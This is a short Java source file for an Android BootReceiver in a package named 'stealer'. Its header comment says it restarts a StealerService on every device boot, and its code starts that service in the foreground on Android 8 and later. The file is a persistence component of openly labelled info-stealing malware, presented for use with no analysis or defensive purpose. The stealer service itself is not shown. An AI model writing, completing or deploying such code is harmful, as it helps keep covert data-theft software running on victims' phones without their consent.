// lang: Java, file: BootReceiver.java, target: Android 8+ API 26
// restarts the stealer service on every device boot

package com.example.zeca.stealer;

import android.content.*;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        Intent svc = new Intent(ctx, StealerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            ctx.startForegroundService(svc);
        else
            ctx.startService(svc);
    }
}